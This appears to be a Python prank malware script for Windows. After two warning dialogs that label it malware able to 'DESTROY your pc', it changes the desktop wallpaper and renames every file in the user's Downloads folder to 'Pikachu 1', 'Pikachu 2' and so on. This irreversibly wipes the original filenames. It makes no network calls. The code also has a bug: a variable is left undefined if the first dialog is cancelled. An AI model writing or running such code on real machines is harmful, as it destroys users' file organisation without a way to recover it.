import subprocess as sub
import win32gui as gui
import win32con as con
import win32api as api
import win32ui as ui
import ctypes
import os
import time
import glob

Running = False

Ask1 = gui.MessageBox(None, "This Malware has the ability to DESTROY your pc.\nDo you want to Run?\n", "WARNING", con.MB_OKCANCEL)
if Ask1 == con.IDOK:
    Ask2 = gui.MessageBox(None, "This is your last warning, are you SURE?", "WARNING", con.MB_OKCANCEL)
if Ask2 == con.IDOK:
    Running = True

def ChangeWallpaper():
    """
    Changes the desktop wallpaper to Assets/Wallpaper.png using the Windows API.
    """
    Wallpaper_Path = "Assets/Wallpaper.png"
    
    # Get the absolute path required by the Windows API
    try:
        # Assumes the script is run from its directory
        script_dir = os.path.dirname(os.path.abspath(__file__))
    except NameError:
        # Fallback for interactive environments
        script_dir = os.getcwd() 
        
    abs_wallpaper_path = os.path.join(script_dir, Wallpaper_Path)

    if not os.path.exists(abs_wallpaper_path):
        print(f"Error: Wallpaper file not found at {abs_wallpaper_path}")
        return False

    # Windows API Constants
    SPI_SETDESKWALLPAPER = 20  # Action ID for setting wallpaper
    SPIF_UPDATEINIFILE   = 0x01 # Write setting to the user profile
    SPIF_SENDWININICHANGE = 0x02 # Notify other windows of the change
    flags = SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE

    # Call the Windows API function
    # user32.dll handles UI/user interaction functions
    result = ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER, 
        0,                    # Parameter not used for this function
        abs_wallpaper_path,   # The full path to the image
        flags                 
    )

def ChangeNames():
    """
    Renames every file in the default Windows Downloads folder to 
    'Pikachu 1.ext', 'Pikachu 2.ext', etc., preserving file extensions.
    """
    
    # --- 1. Define the target directory ---
    # This specifically targets the *current user's* Downloads folder on Windows
    downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
    
    if not os.path.isdir(downloads_path):
        print(f"Downloads directory not found at: {downloads_path}")
        return

    print(f"Targeting directory: {downloads_path}")
    
    # --- 2. Get all files in the directory ---
    # We use glob to get all file paths that likely correspond to files
    files = glob.glob(os.path.join(downloads_path, '*.*'))
    
    if not files:
        print("No files found to rename.")
        return

    # Sort files to ensure a consistent naming order
    files.sort(key=os.path.getmtime) 

    # --- 3. Rename loop ---
    i = 1
    for old_path in files:
        # Get the original file extension (e.g., '.jpg', '.pdf', '.exe')
        _, file_extension = os.path.splitext(old_path)
        
        # Create the new filename: "Pikachu {number}{.ext}"
        new_filename = f"Pikachu {i}{file_extension}"
        
        # Create the full new path
        new_path = os.path.join(downloads_path, new_filename)
        
        # Rename the file
        try:
            os.rename(old_path, new_path)
            i += 1
        except OSError as e:
            print(f"Error renaming file {old_path}: {e}")
            break
            
    print(f"\nRenaming complete. {i-1} files were renamed.")

while Running:
    ChangeWallpaper()
    ChangeNames()
    Running = False